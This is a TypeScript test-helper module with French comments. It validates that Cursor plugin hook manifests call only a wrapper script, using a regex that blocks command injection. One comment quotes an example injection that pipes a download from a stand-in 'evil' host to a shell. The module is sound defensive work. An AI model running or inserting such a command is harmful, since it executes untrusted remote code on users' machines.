/**
 * Pure helpers for the harness-exclusive anti-regression gate.
 * Split out of hooks-harness-exclusive.test.ts to respect the 100-line SOLID limit.
 */
// discoverHooksFiles moved to shared production util; re-exported for the test.
export { discoverHooksFiles } from "../utils/hooks-discovery";

/**
 * Forme imposée par la checklist de soumission Cursor : « All paths in manifest are
 * relative and valid (no `..`, no absolute paths) ». Un manifeste ne peut donc PAS
 * nommer le binaire harness ; il appelle `./scripts/hook.sh`, seul ou suivi
 * d'arguments (scope, `--sound stop`, …), et c'est le wrapper qui résout le harness.
 *
 * Le token d'argument est restreint à `[\w.=/-]+` (pas de `\S+`) : `\S+` matchait
 * aussi bien un token contenant `;`, `&&`, `||`, `` ` ``, `$(…)` ou une redirection
 * dès lors qu'il était séparé du wrapper par un espace — ex. `./scripts/hook.sh &&
 * curl evil | sh` passait la gate. Vérifié à l'exécution (bun -e) : verrouiller le
 * charset ferme cette injection sans rejeter aucun des 21 manifestes réels.
 * @see https://cursor.com/docs/reference/plugins — Submitting a plugin
 */
const WRAPPER_COMMAND = /^\.\/scripts\/hook\.sh(?:\s+[\w.=/-]+)*$/;

/** Chemin du wrapper, relatif à la racine du plugin. */
export const WRAPPER_RELATIVE_PATH = "scripts/hook.sh";

/** Marqueur du binaire harness — cherché dans le wrapper, jamais dans le manifeste. */
export const HARNESS_MARKER = "@fusengine/harness/dist/cli/bin.mjs";

/**
 * Vraie quand le manifeste délègue au wrapper plutôt qu'à une commande ad hoc.
 * @param command - Ligne `command` d'une entrée de hook.
 * @returns `true` si elle appelle `./scripts/hook.sh`.
 */
export function isWrapperCommand(command: string): boolean {
	return WRAPPER_COMMAND.test(command);
}

/**
 * Vraie quand un `scripts/hook.sh` délègue réellement au harness.
 * C'est la couche où « harness exclusif » est vérifiable : le wrapper résout
 * `dist/cli/bin.mjs` et l'invoque en sous-commande `hook cursor`.
 * @param source - Contenu du wrapper.
 * @returns `true` si le harness y est bien invoqué.
 */
export function isHarnessWrapper(source: string): boolean {
	return source.includes(HARNESS_MARKER) && /\bhook\s+cursor\b/.test(source);
}

/**
 * Racine absolue du plugin, depuis `.../plugins/<name>/hooks/hooks.json`.
 * @param filePath - Chemin du manifeste.
 * @returns Le dossier du plugin.
 */
export function pluginRootOf(filePath: string): string {
	return filePath.replace(/\/hooks\/hooks\.json$/, "");
}

/** Plugin name extracted from a `.../plugins/<name>/hooks/hooks.json` path. */
export function pluginNameOf(filePath: string): string {
	return filePath.split("/plugins/")[1]?.split("/")[0] ?? filePath;
}
